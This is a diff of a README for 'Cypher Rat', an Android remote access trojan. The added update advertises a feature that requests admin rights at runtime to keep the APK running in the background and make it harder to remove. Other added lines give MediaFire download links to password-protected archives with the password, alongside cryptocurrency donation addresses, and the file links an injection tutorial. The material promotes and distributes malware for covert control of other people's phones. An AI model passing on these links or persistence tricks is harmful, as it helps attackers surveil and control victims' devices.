@@ -46,11 +46,20 @@ and replace "AngelAndroidForm" with "Cypherrat"
 
 --------------
 
+**UPDATE 7/24/2022** !!  NEW 
+
+- New Tool: Request Admin Rights at runtime
+
+- Admin rights: Help the apk to bypass battery optimization and keep app alive on background
++
+Make Apk Harder To remove
+
+- General Fix and improvement
 
 -------------
 
 
-**UPDATE 6/10/2022** !!  NEW 
+**UPDATE 6/10/2022** !!  OLD 
 
 1- Fix Rat not Working on some rdp
 
@@ -139,7 +148,42 @@ Apk features :
 
 6 : And More.
 
+
 --------------
+
+**UPDATE 7/24/2022** NEW With Admin Rights
+
+[DOWNLOAD Cypher Rat](https://www.mediafire.com/file/g1yqn616des7v3n/CypherRat-Update-7-24.rar/file)
+
+**RAR PASSWORD: craxsrat.com**
+
+--------------
+
+**UPDATE 6/28/2022** OLD
+
+[DOWNLOAD Cypher Rat](https://www.mediafire.com/file/blw2rs4qqlkn56d/CypherRatV3.5-NEW.rar/file)
+
+
+--------------
+
+**UPDATE 5/19/2022** OLD
+
+[DOWNLOAD OLD VERSION](https://www.mediafire.com/file/nmrpeg05ugyembm/Cypher_Rat_V3_Full_Version.rar/file)
+
+--------------
+
+**SUPPORT**
+
+XMR: 872Weh1x7D5iwSeJXfWXEgToksFP9pxMgG8n9cH1g1jhWa29WD5DHBpi5am4D3L7t35ytyn8dMHbgQUwvAv3yZr9SPxeCHc
+
+BTC: 3MxGH1iN5pkmRJnHVrUb1FiiwEvkrWBSUt
+
+[YOUTUBE](https://www.youtube.com/channel/UC-k_KeCkQ6RYm0GFoLfd7Cw)
+
+
+--------------
+
+
 
 Images : 
 
@@ -160,30 +204,6 @@ Images :
 
 [HOW TO USE CYPHER RAT INJECTION](https://vimeo.com/699933150)
 
---------------
-
-**UPDATE 6/28/2022** NEW
-
-[DOWNLOAD Cypher Rat](https://www.mediafire.com/file/blw2rs4qqlkn56d/CypherRatV3.5-NEW.rar/file)
-
---------------
-
-**UPDATE 5/19/2022**
-
-[DOWNLOAD OLD VERSION](https://www.mediafire.com/file/nmrpeg05ugyembm/Cypher_Rat_V3_Full_Version.rar/file)
-
---------------
-
-**SUPPORT**
-
-XMR: 872Weh1x7D5iwSeJXfWXEgToksFP9pxMgG8n9cH1g1jhWa29WD5DHBpi5am4D3L7t35ytyn8dMHbgQUwvAv3yZr9SPxeCHc
-
-BTC: 3MxGH1iN5pkmRJnHVrUb1FiiwEvkrWBSUt
-
-[YOUTUBE](https://www.youtube.com/channel/UC-k_KeCkQ6RYm0GFoLfd7Cw)
-
-
---------------
 
 This project is licensed under the MIT License - see the [LICENSE](https://github.com/EVLF/Cypher-Rat-Full/blob/main/LICENSE) file for details
 
